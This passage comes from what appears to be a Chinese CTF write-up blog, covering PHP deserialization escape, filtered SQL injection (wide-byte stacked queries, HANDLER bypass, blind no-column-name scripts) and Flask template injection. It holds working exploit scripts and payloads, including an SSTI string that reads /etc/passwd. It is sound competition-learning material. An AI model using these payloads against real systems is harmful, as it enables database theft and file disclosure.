class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>附上脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="string">'select password,id from user where username=?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;nickname=<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">'1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token=<span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$a=<span class="keyword">new</span> Info();</span><br><span class="line">$a-&gt;nickname=<span class="string">''</span>;</span><br><span class="line">$a-&gt;CtrlCase=$test;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">'%09'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";s:0:"</span></span><br><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelper<span class="string">":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>User<span class="string">":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";s:0:"</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">";s:6:"</span>dbuser<span class="string">";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:6:"</span>mysqli<span class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>使用相应长度的字符逃逸</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">age=&amp;nickname=******************************************************************************************flagflag";s:8:"CtrlCase";O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";s:0:"";s:8:"CtrlCase";O:6:"dbCtrl":8:&#123;s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到MD5，解密，登录即可拿到flag</p>
<h1 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h1><p>打开题目就是源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    function check($str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = new PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    catch(Exception $e)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(isset($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query("select balabala from table1");</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query("set names gbk");</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(1,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>没有能在题目结束之前解出来，后面看到一篇<a href="http://www.52bug.cn/hkjs/6152.html" target="_blank" rel="noopener">文章</a>，之前也看到一篇文章，不过只有上半部分。使用预编译加上16禁止就可以绕过</p>
<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://localhost/1.php?id=1%df%27;set%20@x='</span>+payload+<span class="string">';prepare%20a%20from%20@x;EXECUTE%20a;'</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="comment"># return html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    he=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> strs:</span><br><span class="line">        he+=hex(ord(x))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(he)</span></span><br><span class="line">    <span class="keyword">return</span> he</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"select if(ascii(substr((%s),%d,1))&gt;%d,sleep(1),1)"</span> % (s_payload,x, mid)</span><br><span class="line">            payload=str2hex(payload)</span><br><span class="line">            t1=time.time()</span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="comment"># if res.status_code == 404 or res.status_code == 429:</span></span><br><span class="line">            <span class="comment">#     x=x-1</span></span><br><span class="line">            <span class="comment">#     error = 1</span></span><br><span class="line">            <span class="comment">#     break</span></span><br><span class="line">            <span class="comment"># html=res.text</span></span><br><span class="line">            <span class="comment"># print('*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> time.time()-t1&gt;=<span class="number">1</span>:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">(db)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\''</span>+db+<span class="string">'\')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\''</span>+table+<span class="string">'\')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select group_concat('</span>+columns+<span class="string">') from '</span>+table</span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data(<span class="string">'flag'</span>,<span class="string">'table1'</span>)</span><br></pre></td></tr></table></figure>







<h1 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h1><p>打开题目是一个提交框，是强网杯 2019随便注改过来的，但是禁止了set，prepare，alter，rename。改表，预处理是不行了。</p>
<p>测试时发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>存在堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1%27||id;show tables;desc words;desc FlagHere;</span><br></pre></td></tr></table></figure>

<p>返回结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag 在FlagHere表中的flag列，经过测试语句应该是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;select data from words where id&#x3D;$_GET[id]&#39;</span><br></pre></td></tr></table></figure>

<p>需要跨表查询，由于select被过滤，但是mysql还有一个handler可以使用（打比赛的时候没有找到，太可惜了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：1&#39;; handler FlagHere open; handler FlagHere read first; handler FlagHere close;#</span><br></pre></td></tr></table></figure>

<p>如果表名是数字需要使用反撇号包裹。</p>
<h1 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h1><p> 是一个提交窗口，经过测试过滤了如下字符0</p>
<p><img src="/pic/111.png" alt=""></p>
<p>后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了</p>
<p><img src="/pic/112.png" alt=""></p>
<p>information_schema.tables可以使用<code>sys.schema_table_statistics_with_buffer</code>或<code>sys.schema_table_statistics_with_buffer</code>代替。</p>
<p>数据使用无列名注入</p>
<p>首先盲注获取数据库名</p>
<p>附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2/24/2020 11:21 AM</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    hexs=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">        hexs+=hex(ord(strs[x]))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(hexs)</span></span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url=<span class="string">'http://0445a30e864f4cd8a6e4a54b3043663dd97491883a5749df.changame.ichunqiu.com/'</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">'0^('</span>+payload+<span class="string">')'</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = requests.post(url,data=data)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line">            <span class="comment"># t1=time.time()</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(html,'*-*-*-*-*-*', mid,'    ',payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    <span class="comment"># print(database)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">(db)</span>:</span></span><br><span class="line">    db=str2hex(db)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema='</span>+db+<span class="string">')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    table = str2hex(table)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class="string">')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea2(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea2</span><span class="params">(length=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    dic=<span class="string">'-'</span>+<span class="string">'0123456789'</span>+string.ascii_lowercase+<span class="string">'&#123;&#125;~'</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= length :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">            payload = <span class="string">"select (select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh)"</span>.format(str2hex(result+dic[each]))</span><br><span class="line">            print(result+dic[each])</span><br><span class="line">            <span class="comment"># t1=time.time()</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(html[0:-6])</span></span><br><span class="line">            <span class="keyword">if</span> error == <span class="number">0</span> <span class="keyword">and</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> html:</span><br><span class="line">                result +=dic[each<span class="number">-1</span>]</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database() #ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tables('ctf')#users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class="line"></span><br><span class="line">binsea2()</span><br></pre></td></tr></table></figure>





<h1 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h1><p>打开题目</p>
<p>在解密中随意输入几个，让其报错，爆出部分代码，发现是一个flask框架写的base64的加解密小工具运行在PYTHON3.7。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果 ： &#123;0&#125;"</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">"no no no !!"</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">         text = <span class="string">""</span></span><br></pre></td></tr></table></figure>

<p>是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码</p>
<p><img src="/pic/114.png" alt=""></p>
<p>任意文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">base64后</span><br><span class="line">e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="/pic/115.png" alt=""></p>
<p>提取/app/app.py所有代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'s_e_c_r_e_t_k_e_y'</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    text = StringField(<span class="string">'BASE64加密'</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'提交'</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm1</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    text = StringField(<span class="string">'BASE64解密'</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'提交'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span></span><br><span class="line">    black_list = [<span class="string">"flag"</span>,<span class="string">"os"</span>,<span class="string">"system"</span>,<span class="string">"popen"</span>,<span class="string">"import"</span>,<span class="string">"eval"</span>,<span class="string">"chr"</span>,<span class="string">"request"</span>,</span><br><span class="line">                  <span class="string">"subprocess"</span>,<span class="string">"commands"</span>,<span class="string">"socket"</span>,<span class="string">"hex"</span>,<span class="string">"base64"</span>,<span class="string">"*"</span>,<span class="string">"?"</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> str.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hint',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">    txt = <span class="string">"失败乃成功之母！！"</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"hint.html"</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果  :&#123;0&#125;"</span>.format(str(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'encode'</span>))</span><br><span 